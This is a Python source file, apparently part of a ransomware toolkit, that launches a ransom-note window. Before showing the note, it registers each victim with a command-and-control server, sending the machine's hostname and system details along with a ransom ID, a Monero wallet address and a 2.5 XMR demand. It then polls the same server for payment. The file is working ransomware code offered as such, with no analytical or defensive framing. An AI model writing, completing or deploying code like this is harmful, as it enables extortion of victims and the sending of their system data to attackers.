#!/usr/bin/env python3
"""
GUI Launcher - Separate process for ransom note
Runs in its own process to avoid tkinter apartment issues
Now with automatic victim registration on C2 server
"""

import sys
import os
import urllib.request
import urllib.error
import json
import platform

# Add current directory to path
sys.path.insert(0, os.path.dirname(__file__))

def register_victim(ransom_id, monero_address, c2_host):
    """Register victim on C2 server before showing GUI"""
    try:
        url = f'http://{c2_host}:5000/api/v1/register'
        
        # Collect basic system info
        system_info = {
            'hostname': platform.node(),
            'platform': platform.system(),
            'processor': platform.processor()
        }
        
        # Prepare registration payload
        payload = {
            'ransom_id': ransom_id,
            'monero_address': monero_address,
            'ransom_amount_xmr': 2.5,  # Default ransom amount
            'system_info': system_info
        }
        
        # Send registration request
        req = urllib.request.Request(
            url,
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req, timeout=10) as r:
            result = json.load(r)
            if result.get('success'):
                print(f"[+] Victim registered successfully: {ransom_id}")
                return True
            else:
                print(f"[!] Registration failed: {result.get('error', 'Unknown error')}")
                return False
                
    except urllib.error.HTTPError as e:
        if e.code == 400 and 'Duplicate' in str(e.read()):
            print(f"[*] Victim already registered (or duplicate ID exists)")
            return True  # Allow GUI to run anyway
        print(f"[!] HTTP Error during registration: {e}")
        return False
    except Exception as e:
        print(f"[!] Registration error: {e}")
        return False

def check_payment_status(ransom_id, c2_host):
    """Check if payment has been made on the C2 server"""
    try:
        url = f'http://{c2_host}:5000/api/v1/payment/status/{ransom_id}'
        with urllib.request.urlopen(url, timeout=5) as r:
            result = json.load(r)
            return result.get('paid', False)
    except Exception as e:
        print(f"[!] Payment check error: {e}")
        return False

if __name__ == '__main__':
    # Parse command line arguments
    if len(sys.argv) < 4:
        print("[!] Usage: gui_launcher.py <ransom_id> <monero_address> <c2_host>")
        sys.exit(1)
    
    ransom_id = sys.argv[1]
    monero_address = sys.argv[2]
    c2_host = sys.argv[3]
    
    try:
        # FIRST: Register victim on C2 server
        print(f"[*] Registering victim on C2 server...")
        if not register_victim(ransom_id, monero_address, c2_host):
            print("[!] Warning: Registration may have failed, but GUI will continue")
        
        # THEN: Load and run GUI
        from ransom_gui import RansomNoteGUI
        
        # Create callback that checks payment
        def payment_callback():
            return check_payment_status(ransom_id, c2_host)
        
        # Create and run GUI with payment callback
        gui = RansomNoteGUI(
            ransom_id=ransom_id,
            monero_address=monero_address,
            c2_host=c2_host,
            payment_check_callback=payment_callback
        )
        
        # This runs the tkinter mainloop - will block until window closes
        gui.run()
        
    except Exception as e:
        print(f"[!] GUI Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
